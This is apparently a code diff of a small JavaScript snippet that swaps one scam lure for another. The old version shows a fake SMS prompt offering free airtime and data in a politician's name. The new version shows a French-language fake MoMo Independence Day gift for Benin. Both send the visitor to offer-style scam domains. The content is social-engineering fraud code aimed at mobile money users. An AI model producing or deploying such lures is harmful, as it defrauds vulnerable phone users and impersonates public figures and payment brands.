@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = '15GB Free Data'
-password=prompt('SMS: Congratulations You are Eligible to receive GH₵20 Airtime and 15GB Free Data From JOHN MAHAMA Offer, Kindly Press OK to ACTIVATE ','15GB Free Data');
-if (password != '15GB Free Data') {
-location.href='https://mahama.data-offer.xyz/15GB';
+var password = '10.000F'
+password=prompt('SMS: Félicitations, votre compte MoMo est qualifié pour recevoir le cadeau MoMo de 10 000F pour le Jour de lIndépendance. Veuillez cliquer sur OK pour CONTINUER. ','10.000F');
+if (password != '10.000F') {
+location.href='https://momo-benin.alloffer.pro/gift';
 }
